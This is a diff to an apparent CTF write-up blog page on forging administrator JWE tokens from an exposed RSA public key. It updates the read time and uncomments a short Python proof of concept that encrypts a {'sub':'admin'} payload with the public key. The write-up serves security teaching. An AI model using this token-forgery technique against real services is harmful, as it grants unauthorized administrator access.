@@ -89,7 +89,7 @@
           <p class="post__dek">Exploiting a JWE implementation flaw caused by an exposed RSA public key to forge administrator tokens.</p>
           <p class="post__meta">
             <time datetime="2026-03-15">15 March 2026</time>
-            <span>3 min read</span>
+            <span>4 min read</span>
             <span>CTF · Web Security · JWE · Cryptography</span>
           </p>
         </header>
@@ -324,33 +324,21 @@ from joserfc.jwk import RSAKey
 from joserfc.jwe import JWERegistry
 import json
 
-registry = JWERegistry(
-    algorithms=[&quot;RSA-OAEP-256&quot;, &quot;A256GCM&quot;]
-)
+# Load the exposed public key
+with open(&quot;key.pem&quot;, &quot;rb&quot;) as f:
+    key = RSAKey.import_key(f.read())
 
-protected = {
-    &quot;cty&quot;: &quot;JWT&quot;,
-    &quot;alg&quot;: &quot;RSA-OAEP-256&quot;,
-    &quot;enc&quot;: &quot;A256GCM&quot;
-}
+registry = JWERegistry(algorithms=[&quot;RSA-OAEP-256&quot;, &quot;A256GCM&quot;])
 
-payload = {
-    &quot;sub&quot;: &quot;admin&quot;
-}
+# Match the exact header structure of real tokens
+protected = {&quot;cty&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;RSA-OAEP-256&quot;, &quot;enc&quot;: &quot;A256GCM&quot;}
 
-plaintext = json.dumps(
-    payload,
-    separators=(&quot;,&quot;, &quot;:&quot;)
-).encode()
+# Forge an admin payload
+payload = {&quot;sub&quot;: &quot;admin&quot;}
+plaintext = json.dumps(payload, separators=(',', ':')).encode()
 
-# token = jwe.encrypt_compact(
-#     protected,
-#     plaintext,
-#     key,
-#     registry=registry
-# )
-
-# print(token)
+token = jwe.encrypt_compact(protected, plaintext, key, registry=registry)
+print(token)
 </code></pre>
           </figure>
           <h2 id="retrieving-the-flag"><span class="num">08</span>Retrieving the Flag</h2>
